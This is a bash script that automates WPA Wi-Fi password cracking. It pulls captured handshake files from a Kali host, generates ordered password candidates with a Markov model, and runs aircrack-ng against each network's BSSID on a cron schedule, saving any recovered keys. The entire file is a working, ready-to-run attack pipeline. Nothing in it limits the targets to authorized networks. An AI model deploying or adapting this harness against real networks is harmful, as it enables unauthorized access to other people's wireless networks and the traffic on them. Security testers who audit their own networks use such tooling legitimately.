#!/bin/bash
# home-pie auto-cracker — aircrack-ng harness (hashcat segfaults on this Pi's pocl CPU backend).
# Pulls handshakes from kali-pie's library and cracks each .cap with markovgen's ordered candidates
# via aircrack-ng (CPU-native, ARM-reliable). First-hit-wins.
#  * 'tried' is marked ONLY AFTER a completed attempt, so a crash/kill/reboot mid-crack never
#    permanently loses a handshake (it's retried next cycle).
#  * flock prevents overlapping cron runs. rsync failure is non-fatal (retry next cycle).
#  * CRACK_COUNT env overrides the candidate budget (production 3M; a verification run can pass small).
set -u
KALI="kali-pie@pie-kali"; LIBRARY_REMOTE="/opt/wpacrack/library/"
BASE="$HOME/crackstack"
IN="$BASE/incoming"; DONE="$BASE/cracked"; TRIED="$BASE/tried"; LOG="$BASE/crackstack.log"
MDL="$BASE/model/combined_o3.mdl"; MG="$BASE/markovgen.py"
COUNT="${CRACK_COUNT:-3000000}"
mkdir -p "$IN" "$DONE" "$TRIED" "$BASE/model"
exec >>"$LOG" 2>&1
exec 9>"$BASE/.lock"; flock -n 9 || { echo "$(date '+%F %T') lock held by another run — skip"; exit 0; }
echo "=== crackstack run $(date '+%F %T')  (count=$COUNT) ==="
rsync -az --timeout=40 --contimeout=15 "$KALI:$LIBRARY_REMOTE" "$IN/" \
  || { echo "rsync failed (kali-pie unreachable?) — retry next cycle"; exit 0; }
find "$IN" -name '*.cap' 2>/dev/null | while read -r cap; do
  key="$(basename "$(dirname "$cap")")_$(basename "$cap")"
  [ -f "$TRIED/$key" ] && continue
  braw="$(basename "$(dirname "$cap")")"
  bssid="$(echo "$braw" | sed -E 's/(..)(..)(..)(..)(..)(..)/\1:\2:\3:\4:\5:\6/' | tr 'A-F' 'a-f')"
  echo "--- crack $cap (bssid $bssid) @ $(date '+%T')"
  OUT="$DONE/$key.key"; CAND="$(mktemp)"
  nice -n 10 python3 "$MG" --model "$MDL" --count "$COUNT" --minlen 8 --maxlen 16 -o "$CAND" 2>/dev/null
  aircrack-ng -w "$CAND" -b "$bssid" -l "$OUT" "$cap" >/dev/null 2>&1
  rm -f "$CAND"
  if [ -s "$OUT" ]; then echo "*** CRACKED $cap -> $(cat "$OUT") ***"
  else echo "not cracked this pass: $cap"; rm -f "$OUT"; fi
  : > "$TRIED/$key"   # mark tried ONLY after a completed attempt
done
echo "=== crackstack done $(date '+%F %T') ==="
